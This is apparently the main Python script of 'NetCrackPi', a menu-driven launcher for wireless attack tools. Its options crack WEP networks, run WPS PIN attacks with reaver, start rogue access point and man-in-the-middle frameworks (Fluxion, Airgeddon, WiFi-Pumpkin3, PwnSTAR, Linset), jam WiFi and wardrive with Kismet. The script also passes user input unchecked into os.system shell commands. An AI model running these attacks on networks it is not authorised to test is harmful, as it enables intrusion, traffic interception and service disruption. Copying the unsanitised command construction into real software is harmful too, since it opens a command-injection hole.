#!/usr/bin/env python3
import os
from colorama import Fore, Style

interface = input(Fore.CYAN + '[*]Enter interface to use: ' + Style.RESET_ALL)
ops = list(range(1,18))

def wait():
  wait = input('PRESS ENTER TO CONTINUE')

os.chdir('/opt/NetCrackPi')

def main():
  print(Fore.GREEN + Style.BRIGHT + '       _   __     __      ______     ______       __')
  print('      / | / /__  / /_    / ____/____/ ____ \_____/ /__')
  print('     /  |/ / _ \/ __/   / /   / ___/ / __ `/ ___/ //_/')
  print('    / /|  /  __/ /_    / /___/ /  / / /_/ / /__/ ,<')
  print('   /_/ |_/\___/\__/____\____/_/   \ \__,_/\___/_/|_|')
  print('                 /_____/           \____/' + Style.RESET_ALL)
  print('==========================================================')
  print(Fore.GREEN + Style.BRIGHT + '*[1] Scan Local Networks (Airodump-ng)                   *')
  print('*[2] Scan Local Networks (Wash)                          *')
  print('*[3] Crack WEP Network                                   *')
  print('*[4] Crack WPA/WPA2 Network Using PIN (Pixie-Dust) Method*')
  print('*[5] Wifite2 (Automated Network Cracker)                 *')
  print('*[6] Ettercap (MiTM Attack)                              *')
  print('*[7] Fluxion (MiTM/Router Spoof Attack)                  *')
  print('*[8] Airgeddon (Attack Framework - Graphical)            *')
  print('*[9] WiFi-Pumpkin3 (Rogue AP - Graphical)                 *')
  print('*[10] WifiJammer (Use for RPi or w/ multiple adapters)   *')
  print('*[11] Pentbox1.8 (HoneyPot Setup)                        *')
  print('*[12] PwnSTAR (Fake AP Tool Framework)                   *')
  print('*[13] HT-WPS (WPS Pin Extraction Tool)                   *')
  print('*[14] Kismet GPS Wardriver                               *')
  print('*[15] Linset (WPA/WPA2 MiTM Attack Tool)                 *')
  print('*[16] Snort (Network Intrusion Detection System)         *')
  print('*[17] Update Net_Crack                                   *')
  print('*[18] Exit                                               *' + Style.RESET_ALL)
  print('==========================================================')
  in_put = input(': ')
  if in_put == '1':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    os.system('airmon-ng start ' + interface)
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('airodump-ng ' + interface + 'mon')
    os.system('airmon-ng stop ' + interface + 'mon') 
    wait()
  if in_put == '2':
    print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
    os.system('airmon-ng start ' + interface)
    print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
    os.system('wash -i ' + interface + 'mon')
    os.system('airmon-ng stop ' + interface + 'mon')
    wait()
  if in_put == '3':
    bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
    os.system('airmon-ng start ' + interface)
    os.system('besside-ng -b ' + bssid + ' -c ' + channel + ' ' + interface + 'mon')
    os.system('aircrack-ng wep.cap')
    os.system('airmon-ng stop ' + interface + 'mon')
    wait()
  if in_put == '4':
    bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
    channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
    print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
    os.system('airmon-ng start ' + interface)
    os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
    os.system('airmon-ng stop ' + interface + 'mon')
    wait()
  if in_put == '5':
    print(Fore.CYAN + '[*]Starting Wifite2...' + Style.RESET_ALL)
    try:
      os.chdir('wifite2')
      os.system('python3 Wifite.py')
      print(Fore.GREEN + '[+]Successfully ran wifite.py!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running wifite.py' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '6':
    got = input(Fore.CYAN + '[*]Do you want to run ettercap in Graphical or Text mode?[G/T]: ' + Style.RESET_ALL)
    try:
      if got == 'G':
        print(Fore.CYAN + '[*]Running ettercap in graphical mode...' + Style.RESET_ALL)
        os.system('sudo ettercap -G')
        print(Fore.GREEN + '[+]Successfully ended ettercap in graphical mode!' + Style.RESET_ALL)
      else:
        print(Fore.CYAN + '[*]Running ettercap in text mode...' + Style.RESET_ALL)
        os.system('sudo ettercap -C')
        print(Fore.GREEN + '[+]Successfully ended ettercap in text mode!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running ettercap!' + Style.RESET_ALL)
    wait()
  if in_put == '7':
    print(Fore.CYAN + '[*]Starting Fluxion...' + Style.RESET_ALL)
    try:
      os.chdir('fluxion')
      os.system('./fluxion.sh')
      print(Fore.GREEN + '[+]Successfully ran fluxion.sh!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running fluxion.sh' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '8':
    print(Fore.CYAN + '[*]Starting Airgeddon...' + Style.RESET_ALL)
    try:
      os.chdir('airgeddon')
      os.system('./airgeddon.sh')
      print(Fore.GREEN + '[+]Successfully ran airgeddon.sh!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running airgeddon.sh' + Style.RESET_ALL)
    os.chdir('..')
    wait()
  if in_put == '9':
    print(Fore.CYAN + '[*]Starting WiFi-Pumpkin...' + Style.RESET_ALL)
    try:
      os.system('sudo wifipumpkin3')
      print(Fore.GREEN + '[+]Successfully ran WiFi-Pumpkin!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running WiFi-Pumpkin' + Style.RESET_ALL)
    wait()
  if in_put == '10':
    print(Fore.CYAN + '[*]Starting WiFiJammer Process...')
    try:
      print('[*]Shutting down onboard WiFi adapter...' + Style.RESET_ALL)
      os.system('sudo ifconfig wlan0 down')
      os.chdir('wifijammer')
      s_o_m = input(Fore.CYAN + "[*]Do you want to run in [s]tationary or [m]oving mode?: " + Style.RESET_ALL)
      if s_o_m == 's' or s_o_m == 'S':
        os.system('sudo python wifijammer.py')
      elif s_o_m == 'm' or s_o_m == 'M':
        os.system('sudo python wifi-jammer.py -m 10')
      else:
        print(Fore.RED + '[*]Not an option!' + Style.RESET_ALL)
      wait()
      print(Fore.GREEN + '[+]Successfully ran wifijammer!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running wifijammer' + Style.RESET_ALL)
    wait()
  if in_put == '11':
    print(Fore.CYAN + '[*]Starting Pentbox1.8...' + Style.RESET_ALL)
    try:
      os.chdir('pentbox-1.8')
      os.system('sudo ruby pentbox.rb')
      print(Fore.GREEN + '[+]Successfully ran pentbox1.8!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running pentbox1.8' + Style.RESET_ALL)
    os.chdir('..')
    wait()
  if in_put == '12':
    print(Fore.CYAN + '[*]Starting PwnSTAR...' + Style.RESET_ALL)
    try:
      os.chdir('PwnSTAR')
      os.system('sudo ./pwnstar')
      print(Fore.GREEN + '[+]Successfully ran PwnSTAR!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running PwnSTAR' + Style.RESET_ALL)
    os.chdir('..')
    wait()
  if in_put == '13':
    print(Fore.CYAN + '[*]Starting HT-WPS...')
    try:
      os.chdir('HT-WPS-Breaker')
      os.system("sudo ./HT-WB.sh")
      print(Fore.GREEN + '[+]Successfully ran HT-WPS' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running HT-WPS' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '14':
    print(Fore.GREEN + "   _       __              ____       _")
    print("  | |     / /___ ______   / __ \_____(_)   _____ ")
    print("  | | /| / / __ `/ ___/  / / / / ___/ / | / / _ \ ")
    print("  | |/ |/ / /_/ / /     / /_/ / /  / /| |/ /  __/")
    print("  |__/|__/\__,_/_/     /_____/_/  /_/ |___/\___/")
    print("==================================================" + Style.RESET_ALL)
    print(Fore.CYAN + "[*]Insert GPS Device..." + Style.RESET_ALL)
    wait()
    print(Fore.CYAN + "[*]Listing Connected GPS Devices..." + Style.RESET_ALL)
    os.system("sudo lsusb")
    os.system("sudo dmesg | grep tty")
    gpsd = input(Fore.CYAN + "[*]Enter gpsd dev path (/dev/ttyUSB#): " + Style.RESET_ALL)
    os.system("sudo gpsd " + gpsd)
    print(Fore.CYAN + "[*]Attemping to open GPS Device Info")
    print("[*]If info is read, ^C to continue setup, else restart script..." + Style.RESET_ALL)
    os.system("sudo cgps")
    print(Fore.CYAN + "[*]Attempting to run kismet to collect network data in the vicinity, ^C when you're done recording to shutdown Kismet server..." + Style.RESET_ALL)
    os.system('sudo kismet')
    print(Fore.CYAN + "[*]Upload kismet data to Wigle.net to create network map" + Style.RESET_ALL)
    print(Fore.GREEN + "[+]Done!" + Style.RESET_ALL)
  if in_put == '15':
    print(Fore.CYAN + '[*]Starting linset...' + Style.RESET_ALL)
    try:
      os.chdir('linset')
      os.system('sudo ./linset')
      print(Fore.GREEN + '[*]Successfully ran linset' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Error running linset' + Style.RESET_ALL)
    os.chdir('..')
  if in_put == '16':
    print(Fore.CYAN + '[*]Running Snort NIDS...')
    ipnet = input('[*]Enter IPnet (ex. 192.168.1.0/24): ')
    print('[*]Starting NIDS, Enter ^Z to exit...' + Style.RESET_ALL)
    os.system('sudo snort -d -l snortlogs -h ' + ipnet + ' -A console -c /etc/snort/snort.conf')
    print(Fore.GREEN + '[+]Finished Running Snort!' + Style.RESET_ALL)
  if in_put == '17':
    print(Fore.CYAN + '[*]Updating Packages & Net_Crack...' + Style.RESET_ALL)
    os.system('sudo apt-get update && sudo apt-get upgrade')
    os.system('sudo apt autoremove')
    os.system('sudo git pull origin master')
    print(Fore.GREEN + '[+]Update Complete!' + Style.RESET_ALL)
  if in_put == '18':
    print(Fore.CYAN + '[*]Shutting down ' + interface + 'mon...' + Style.RESET_ALL)
    os.system('airmon-ng stop ' + interface)
    os.system('airmon-ng stop ' + interface + 'mon')
    os.system('ifconfig ' + interface + ' up')
    exit()
  elif int(in_put) not in ops:
    print(Fore.RED + '[*]Not an option!' + Style.RESET_ALL)
  main()
main()
